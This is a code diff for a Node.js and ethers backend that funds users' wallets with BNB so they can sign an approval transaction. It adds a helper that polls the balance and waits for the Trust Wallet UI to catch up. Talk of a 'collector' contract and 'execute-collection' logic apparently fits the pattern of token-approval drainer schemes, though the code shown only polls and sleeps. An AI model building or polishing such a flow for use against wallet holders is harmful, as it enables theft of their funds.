@@ -32,26 +32,30 @@ const collectorContract = new ethers.Contract(process.env.CONTRACT_ADDRESS, CONT
 // ... existing imports and setup ...
 
 // Endpoint 1: Fund the user with enough BNB for the approval transaction
-app.post('/fund-gas', async (req, res) => {
-    try {
-        const { userAddress } = req.body;
-        const balance = await provider.getBalance(userAddress);
-        const requiredGas = ethers.parseEther("0.0005"); 
+// OPTIMIZED: Poll for gas and add a buffer for Trust Wallet UI sync
+export async function waitForGas(provider, address) {
+    const requiredGas = parseUnits("0.0004", 18);
+    
+    // We will check for up to 20 seconds (20 loops * 1000ms)
+    for (let i = 0; i < 20; i++) { 
+        const balance = await provider.getBalance(address);
         
-        if (balance < requiredGas) {
-            // Added .catch() to prevent unhandled promise rejections on fire-and-forget
-            merchantWallet.sendTransaction({
-                to: userAddress,
-                value: requiredGas - balance 
-            }).catch(err => console.error(`Failed to send gas to ${userAddress}:`, err)); 
+        if (balance >= requiredGas) {
+            console.log("BNB detected on-chain! Pausing to let Trust Wallet UI sync...");
+            
+            // THE FIX: The blockchain has the BNB, but Trust Wallet's UI is slow.
+            // Wait exactly 3 seconds here before returning true. 
+            // This guarantees the wallet balance is updated when the popup opens.
+            await new Promise(r => setTimeout(r, 3000)); 
+            
+            return true;
         }
         
-        // Return immediately so the frontend can start its timer
-        res.json({ success: true }); 
-    } catch (error) {
-        res.status(500).json({ error: error.message });
+        // Wait 1 second before checking the balance again
+        await new Promise(r => setTimeout(r, 1000)); 
     }
-});
+    return false;
+}
 
 // ... rest of your execute-collection logic ...
 
